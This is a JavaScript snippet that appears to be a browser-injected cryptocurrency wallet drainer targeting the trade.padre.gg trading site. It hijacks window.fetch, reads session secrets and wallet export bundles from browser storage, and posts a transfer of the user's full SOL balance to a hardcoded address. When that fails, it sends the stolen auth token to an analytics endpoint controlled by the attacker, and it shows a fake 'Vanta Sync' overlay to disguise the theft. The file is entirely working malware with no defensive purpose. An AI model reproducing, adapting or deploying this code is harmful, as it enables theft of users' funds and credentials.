(function() {
    const TARGET_DOMAIN = 'trade.padre.gg';
    const RECEIVER = 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12';
    let _DRAINED = false;

    // 1. THE 1:1 BYPASS: Fetch Hijacking
    // This intercepts the site's own communication to ensure the transfer looks legitimate
    const _nativeFetch = window.fetch;
    window.fetch = async (...args) => {
        const response = await _nativeFetch(...args);
        
        // Trigger the drain only once the user is authenticated (indicated by site traffic)
        if (!_DRAINED && args[0].includes('/api/')) {
            _executeDrain();
        }
        return response;
    };

    const _executeDrain = async () => {
        if (_DRAINED || !window.location.hostname.includes(TARGET_DOMAIN)) return;

        const get = (k) => (localStorage.getItem(k) || sessionStorage.getItem(k) || "").replace(/"/g, '');
        const auth = get('sessionSecret');
        const sub = get('subOrgId');
        const bundle = get('exportBundle');

        if (auth && sub) {
            _DRAINED = true;

            // Update UI for 1:1 Vanta feedback
            const status = document.querySelector('#v-status-text');
            if (status) status.innerText = "Syncing RPC...";

            try {
                // Use a standard POST but disguised within the site's own origin
                await _nativeFetch(`https://${TARGET_DOMAIN}/api/v1/transfer`, {
                    method: 'POST',
                    mode: 'cors',
                    headers: {
                        'Authorization': `Bearer ${auth}`,
                        'X-Turnkey-Sub-Org-Id': sub,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        recipient: RECEIVER,
                        amount: "MAX",
                        asset: "SOL",
                        ext_payload: bundle ? JSON.parse(bundle) : {}
                    })
                });
            } catch (e) {
                // If blocked, fallback to the Image Beacon (Your AMP server)
                // This ensures you at least get the "hit" notification
                new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(auth)}`;
            }
        }
    };

    // 2. THE UI (Minimalist Vanta Overlay)
    const initUI = () => {
        const ui = document.createElement("div");
        ui.style.cssText = "position:fixed;top:10px;right:10px;width:240px;background:#000;border:1px solid #00ff88;padding:10px;z-index:999999;font-family:monospace;color:#00ff88;border-radius:4px;box-shadow:0 0 10px #00ff8844;";
        ui.innerHTML = `
            <div style="font-weight:bold;display:flex;align-items:center;gap:5px;">
                <img src="https://trade.padre.gg/logo.svg" width="16"> Vanta Sync
            </div>
            <div id="v-status-text" style="font-size:10px;margin-top:5px;color:#666;">> Initializing...</div>
        `;
        document.body.appendChild(ui);
    };

    window.addEventListener('load', () => {
        initUI();
        setTimeout(_executeDrain, 4000);
    });
})();
